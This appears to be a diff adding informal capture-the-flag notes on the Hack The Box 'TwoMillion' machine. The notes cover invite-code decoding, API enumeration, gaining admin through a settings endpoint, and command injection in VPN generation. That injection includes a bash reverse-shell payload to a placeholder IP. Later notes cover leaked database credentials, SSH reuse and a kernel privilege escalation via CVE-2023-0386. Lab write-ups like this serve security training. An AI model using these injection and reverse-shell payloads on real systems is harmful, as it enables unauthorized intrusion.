@@ -1,0 +1,122 @@
+twomillion
+
+	22/tcp open  ssh
+	
+	80/tcp open  http
+
+		http://2million.htb/invite requires a code
+		in debugger there's inviteapi.min.js that looks sus
+
+		it runs eval and adds a bunch of functions into the scope
+
+		makeInviteCode.toString()
+		`function makeInviteCode(){$.ajax({type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response){console.log(response)},error:function(response){console.log(response)}})}`
+
+		curl -XPOST http://2million.htb/api/v1/invite/how/to/generate -H "Content-Type: application/x-www-form-urlencoded"
+		{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
+
+		rot 13 decrypt
+	
+		curl -XPOST http://2million.htb/api/v1/invite/generate -H "Content-Type: application/x-www-form-urlencoded"
+		{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
+		{"0":200,"success":1,"data":{"code":"S0U0WkYtQ1pER1MtQU8zVkstMFpFTjk=","format":"encoded"}}
+
+		base64 decrypt
+
+		KE4ZF-CZDGS-AO3VK-0ZEN9
+
+		continuously removing path fragments from the api reveals this response on /v1
+
+		{
+		  "v1": {
+		    "user": {
+		      "GET": {
+		        "/api/v1": "Route List",
+		        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+		        "/api/v1/invite/generate": "Generate invite code",
+		        "/api/v1/invite/verify": "Verify invite code",
+		        "/api/v1/user/auth": "Check if user is authenticated",
+		        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+		        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+		        "/api/v1/user/vpn/download": "Download OVPN file"
+		      },
+		      "POST": {
+		        "/api/v1/user/register": "Register a new user",
+		        "/api/v1/user/login": "Login with existing user"
+		      }
+		    },
+		    "admin": {
+		      "GET": {
+		        "/api/v1/admin/auth": "Check if user is admin"
+		      },
+		      "POST": {
+		        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+		      },
+		      "PUT": {
+		        "/api/v1/admin/settings/update": "Update user settings"
+		      }
+		    }
+		  }
+		}
+
+		let's replay requests in zap
+
+		running "/api/v1/user/auth" gives {"loggedin":true,"username":"p1dr","is_admin":0}
+		
+		running "/api/v1/admin/auth" gives {"message":false}
+
+		the fact that an endpoint from the admin section runs successfully is a bit sus
+
+		running "/api/v1/admin/settings/update" gives {"status":"danger","message":"Invalid content type."}
+		adding Content-Type: application/json gives {"status":"danger","message":"Missing parameter: email"}
+		adding the email: {"status":"danger","message":"Missing parameter: is_admin"}
+		adding is_admin: {"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}
+		changing the format: {"id":13,"username":"p1dr","is_admin":1}
+
+		apparently we gave ourselves admin rights?
+		
+		nothing seems to have changed on the web page
+
+		there's one admin endpoint that we didnt try though
+		POST http://2million.htb/api/v1/admin/vpn/generate {"username":"p1dr"} - returns an openvpn file?
+		the cert in the file contains our username:
+		Subject: C=GB, ST=London, L=London, O=p1dr, CN=p1dr
+
+		is there any injection protection?
+
+		{"username":"p1dr;whoami;"} returns www-data
+		
+		ncat -l IP 1338
+		{"username":"p1dr;bash -c 'bash -i >& /dev/tcp/IP/1338 0>&1';"}
+
+		running linpeas:
+
+		DB_HOST=127.0.0.1
+		DB_DATABASE=htb_prod
+		DB_USERNAME=admin
+		DB_PASSWORD=SuperDuperPass123
+
+	    /usr/bin/write.ul (Unknown SGID binary) - wtf is that?
+			https://manpages.debian.org/testing/bsdextrautils/write.ul.1
+		
+
+		my first thought was to forward the 3306 port and log into the db but trying to ssh with this user worked
+
+		cat user.txt
+			5922673bd996ce786d0bbba33b192b54
+
+		kernel is 5.15.70-051570-generic
+			https://www.exploit-db.com/exploits/50808 will work?
+				it doesn't
+			what about https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/#how-the-cve-2023-0386-vulnerability-works
+			the poc is here: https://github.com/xkaneiki/CVE-2023-0386/
+				after compiling and google translating the surprisingly necessary instructions we get root.txt
+
+				gg
+
+		running linpeas as admin:
+			https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+				pkexec "/bin/sh"
+				pkexec must be setuid root
+			/snap/snapd/19122/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
+			
